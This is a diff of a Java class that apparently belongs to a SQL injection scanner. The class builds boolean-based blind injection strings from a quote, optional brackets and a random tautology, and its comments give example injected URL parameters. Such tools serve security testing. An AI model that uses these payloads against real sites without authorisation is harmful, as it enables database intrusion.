@@ -2,23 +2,28 @@ package de.nshevchenko.sqlinjection.type;
 
 import org.apache.commons.lang.RandomStringUtils;
 
-/**
- * Created by IntelliJ IDEA.
- * User: nshevchenko
- * Date: 18.05.12
- * Time: 12:31
- * To change this template use File | Settings | File Templates.
- */
+
 public class SingleQuotedStringSQLInjection implements SQLInjection{
 
 
     //action=artikel' AND 'IXSZX'='IXSZX&cat=8&id=17&artlang=de
     //action=artikel&cat=8&id=17&artlang=de' AND 'ITCOB'='ITCOB
+    //action=artikel&cat=8&id=17&artlang=de' AND 'ITCOB'='ITCOB
     
-    public String createInjection(String oldValue){
+
+
+    public String createInjectionWithNumberOfBrackets(String oldValue, int numberOfBrackets){
         String randomString = RandomStringUtils.randomAlphabetic(4);
         StringBuffer myNewValue = new StringBuffer(oldValue);
-        myNewValue.append("' AND '");
+        myNewValue.append("'" );
+        for(int i=0; i<numberOfBrackets; i++){
+            myNewValue.append(")");
+        }
+        myNewValue.append(" AND ");
+        for(int i=0; i<numberOfBrackets; i++){
+            myNewValue.append("(");
+        }
+        myNewValue.append("'");
         myNewValue.append(randomString);
         myNewValue.append("'='");
         myNewValue.append(randomString);
